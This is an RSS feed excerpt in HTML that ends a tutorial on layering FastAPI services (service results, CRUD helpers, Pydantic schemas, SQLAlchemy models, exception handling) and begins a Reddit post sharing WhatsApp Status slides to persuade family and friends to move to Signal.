<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.success </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">False</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.exception_case </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> arg.exception_case</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.status_code </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> arg.status_code</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">else</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.success </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">True</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">9</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.exception_case </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">None</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">10</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.status_code </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">None</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">11</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.value </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> arg</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">12</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__str__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">13</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.success:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">14</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">"[Success]"</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">15</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">f</span><span data-v-3d5c50e8="">'[Exception] "</span><span data-v-3d5c50e8="">{</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.exception_case</span><span data-v-3d5c50e8="">}</span><span data-v-3d5c50e8="">"'</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">16</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__repr__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">17</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.success:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">18</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">"&lt;ServiceResult Success&gt;"</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">19</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">f</span><span data-v-3d5c50e8="">"&lt;ServiceResult AppException </span><span data-v-3d5c50e8="">{</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.exception_case</span><span data-v-3d5c50e8="">}</span><span data-v-3d5c50e8="">&gt;"</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">20</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__enter__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">21</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.value</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">22</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__exit__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">*</span><span data-v-3d5c50e8="">kwargs</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">23</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">pass</span></span>


<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">24</span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">handle_result</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">result</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> ServiceResult</span><span data-v-3d5c50e8="">) -&gt; :</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">25</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">not</span><span data-v-3d5c50e8=""> result.success:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">26</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">with</span><span data-v-3d5c50e8=""> result </span><span data-v-3d5c50e8="">as</span><span data-v-3d5c50e8=""> exception:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">27</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">raise</span><span data-v-3d5c50e8=""> exception</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">28</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">with</span><span data-v-3d5c50e8=""> result </span><span data-v-3d5c50e8="">as</span><span data-v-3d5c50e8=""> result:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">29</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> result</span></span></code></pre></div>
<h2 id="service-layer--business-logic" data-v-3d5c50e8="">Service Layer – Business Logic</h2>
<p data-v-3d5c50e8="">Services are defined in the <code data-v-3d5c50e8="">services</code> package. Each service is a subclass of <code data-v-3d5c50e8="">AppService</code>. The database session is passed down from the request dependency via an "interface-like" mixin utility class (other mixing classes may be added via multiple inheritance in order to extend available attributes).</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> DBSessionMixin</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__init__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> db</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> Session</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> db</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> AppService(DBSessionMixin)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">pass</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> AppCRUD(DBSessionMixin)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">pass</span></span></code></pre></div>
<p data-v-3d5c50e8="">Routes belonging to service <code data-v-3d5c50e8="">Foo</code> are connected to methods of <code data-v-3d5c50e8="">FooService</code>, which encapsulates all business logic of the service. The return value are of type <code data-v-3d5c50e8="">ServiceResult</code>: Containing a value attribute with returnable data or, in case of an exception, an <code data-v-3d5c50e8="">AppException</code>. In both cases, the respective result is returned back "upwards" to the controller layer.</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> FooService(AppService)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">create_item</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> item</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> FooItemCreate</span><span data-v-3d5c50e8="">) -&gt; ServiceResult:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">        foo_item </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> FooCRUD(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db).create_item(item)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">not</span><span data-v-3d5c50e8=""> foo_item:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> ServiceResult(AppException.FooCreateItem())</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> ServiceResult(foo_item)</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">get_item</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> item_id</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">int</span><span data-v-3d5c50e8="">) -&gt; ServiceResult:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">        foo_item </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> FooCRUD(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db).get_item(item_id)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">9</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">not</span><span data-v-3d5c50e8=""> foo_item:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">10</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> ServiceResult(AppException.FooGetItem({</span><span data-v-3d5c50e8="">"item_id"</span><span data-v-3d5c50e8="">: item_id}))</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">11</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">not</span><span data-v-3d5c50e8=""> foo_item.public:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">12</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> ServiceResult(AppException.FooItemRequiresAuth())</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">13</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> ServiceResult(foo_item)</span></span></code></pre></div>
<h2 id="data-access-layer--database-operations" data-v-3d5c50e8="">Data Access Layer – Database Operations</h2>
<p data-v-3d5c50e8="">CRUD helper methods perform operations on the database and are subclassing <code data-v-3d5c50e8="">AppCRUD</code>. The database session is passed down from the <code data-v-3d5c50e8="">AppService</code> instance. These methods are atomic and only concerned with operating on the database. They do not contain any business logic.</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> FooCRUD(AppCRUD)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">create_item</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> item</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> FooItemCreate</span><span data-v-3d5c50e8="">) -&gt; FooItem:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">        foo_item </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> FooItem(</span><span data-v-3d5c50e8="">description</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">item.description, </span><span data-v-3d5c50e8="">public</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">item.public)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db.add(foo_item)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db.commit()</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db.refresh(foo_item)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> foo_item</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">get_item</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> item_id</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">int</span><span data-v-3d5c50e8="">) -&gt; FooItem:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">9</span><span data-v-3d5c50e8="">        foo_item </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db.query(FooItem).filter(FooItem.id </span><span data-v-3d5c50e8="">==</span><span data-v-3d5c50e8=""> item_id).first()</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">10</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> foo_item:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">11</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> foo_item</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">12</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">None</span></span></code></pre></div>
<p data-v-3d5c50e8="">Pydantic "schemas" or models are defined in the <code data-v-3d5c50e8="">schemas</code> package. They contain mainly two different kinds of data models. First, those expected from clients as request data (route parameters in route method definitions). Second, those expected to be returned to clients as response data (defined in response_model parameter of route definitions).</p>
<p data-v-3d5c50e8="">Additionally, it's possible to model any kind of data being passed inbetween the layers of the app (controller, service and data-access).</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> FooItemBase(BaseModel)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    description: </span><span data-v-3d5c50e8="">str</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> FooItemCreate(FooItemBase)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">    public: </span><span data-v-3d5c50e8="">bool</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> FooItem(FooItemBase)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">id</span><span data-v-3d5c50e8="">: </span><span data-v-3d5c50e8="">int</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> Config</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">        orm_mode </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">True</span></span></code></pre></div>
<p data-v-3d5c50e8="">SQLAlchemy models are defined in the <code data-v-3d5c50e8="">models</code> package. They define how data is stored within the relational database. They are referenced from <code data-v-3d5c50e8="">AppCRUD</code>. If needed, make sure to differentiate between <code data-v-3d5c50e8="">FooItem</code> models (SQLAlchemy) and <code data-v-3d5c50e8="">FooItem</code> schemas (Pydantic) by appropriate import namespacing.</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> FooItem(Base)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    __tablename__ </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">"foo_items"</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">id</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> Column(Integer, </span><span data-v-3d5c50e8="">primary_key</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">True</span><span data-v-3d5c50e8="">, </span><span data-v-3d5c50e8="">index</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">True</span><span data-v-3d5c50e8="">)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">    description </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> Column(String)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">    public </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> Column(Boolean, </span><span data-v-3d5c50e8="">default</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">False</span><span data-v-3d5c50e8="">)</span></span></code></pre></div>
<h2 id="exception-handling" data-v-3d5c50e8="">Exception Handling</h2>
<p data-v-3d5c50e8="">App exceptions are implemented in the <code data-v-3d5c50e8="">utils</code> package. First, <code data-v-3d5c50e8="">AppExceptionCase</code> is subclassed from base <code data-v-3d5c50e8="">Exception</code> and includes various attributes for defining custom app exception scenarios. The exception handler with the task of handling custom app exceptions (added to <code data-v-3d5c50e8="">main</code>, see above) is defined with a response containing information about the app exception.</p>
<div data-v-3d5c50e8=""><div data-v-594b4fde="" data-v-3d5c50e8=""><pre data-v-594b4fde=""><span data-v-594b4fde=""><span data-v-594b4fde="">⬤</span> <span data-v-594b4fde="">⬤</span> <span data-v-594b4fde="">⬤</span><span data-v-594b4fde=""><span data-v-594b4fde="">utils ›</span></span><span data-v-594b4fde="">app_exceptions.py</span></span></pre></div><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> AppExceptionCase(</span><span data-v-3d5c50e8="">Exception</span><span data-v-3d5c50e8="">)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__init__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> status_code</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">int</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> context</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">dict</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.exception_case </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.</span><span data-v-3d5c50e8="">__class__</span><span data-v-3d5c50e8="">.</span><span data-v-3d5c50e8="">__name__</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.status_code </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> status_code</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.context </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> context</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__str__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> (</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">f</span><span data-v-3d5c50e8="">"&lt;AppException </span><span data-v-3d5c50e8="">{</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.exception_case</span><span data-v-3d5c50e8="">}</span><span data-v-3d5c50e8=""> - "</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">9</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">+</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">f</span><span data-v-3d5c50e8="">"status_code=</span><span data-v-3d5c50e8="">{</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.status_code</span><span data-v-3d5c50e8="">}</span><span data-v-3d5c50e8=""> - context=</span><span data-v-3d5c50e8="">{</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.context</span><span data-v-3d5c50e8="">}</span><span data-v-3d5c50e8="">&gt;"</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">10</span><span data-v-3d5c50e8="">        )</span></span>


<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">11</span><span data-v-3d5c50e8="">async</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">app_exception_handler</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">request</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> Request</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> exc</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> AppExceptionCase</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">12</span><span data-v-3d5c50e8="">    </span>…</span></code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://camillovisini.com/article/abstracting-fastapi-services/">https://camillovisini.com/article/abstracting-fastapi-services/</a></em></p>]]>
            </description>
            <link>https://camillovisini.com/article/abstracting-fastapi-services/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25797140</guid>
            <pubDate>Fri, 15 Jan 2021 22:03:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[WhatsApp Status to convince your family and friends to switch to Signal]]>
            </title>
            <description>
<![CDATA[
Score 69 | Comments 21 (<a href="https://news.ycombinator.com/item?id=25796535">thread link</a>) | @karlzt
<br/>
January 15, 2021 | https://teddit.net/r/signal/comments/kwovyz/whatsapp_status_to_convince_your_family_friends/ | <a href="https://web.archive.org/web/*/https://teddit.net/r/signal/comments/kwovyz/whatsapp_status_to_convince_your_family_friends/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><!-- SC_OFF --><div><p><strong>**UPDATE: Ready to use after WA announced T&amp;C delay! New languages: Slovak, Czech, Portuguese (PT), Finnish, Turkish, Hindi, Spanish, Portuguese (BR), Italian, French, Dutch - more coming soon*\</strong>*</p>

<blockquote>
<p>Hey there, I'm using Signal!</p>
</blockquote>

<p>When people switch to Signal they often have the problem to convince all their contacts from WhatsApp to do the same. I had that struggle too.</p>

<p>That's why I created something to put into my WhatsApp Status: around 20 slides explaining why to switch and why I am going to delete WhatsApp. I think it's better to be educational than pushy or insulting to get people to switch, so I tried it this way and successfully got my family and friends to switch to Signal.</p>

<p>Now I decided to share the slides with you and hope they help you too!</p>



<p>There are 2 versions for each language: One including a comment about GDPR (for EU citizens) and one that does not mention anything about GDPR (rest of world).</p>

<p>F<em>or UK users:</em> <a href="https://teddit.net/u/Winnie_the_Pooch">u/Winnie_the_Pooch</a> <em>commented: "[...] use the EU version. Even though weâ€™ve now left, the EU GDPR has (thankfully!) been enshrined in British law as the</em> <a href="https://ico.org.uk/for-organisations/dp-at-the-end-of-the-transition-period/data-protection-now-the-transition-period-has-ended/the-gdpr/"><em>UK GDPR</em></a> <em>[...]". Lucky you!</em></p>



<p>WhatsApp delays their privacy policy update to <strong>mid of may</strong>!</p>

<p><strong>But this does not change the facts mentioned in the slides about metadata etc.!</strong> So, why should you wait until may? On the other hand, you now have more time to convince your contacts to switch!</p>

<p><strong>UPDATE:</strong> I updated each version like the following:</p>

<ul>
<li>The first slide does not have a headline anymore. You can add your own text here using the editing options in WhatsApp (its the T on the top right) or your favorite graphic editing software. Write something along the line as "I will delete WhatsApp on [insert date here]" or similar.</li>
<li>I replaced the last two chat messages on slide 03 with the text from slide 04. Total amount of slides reduced to 19!</li>
</ul>

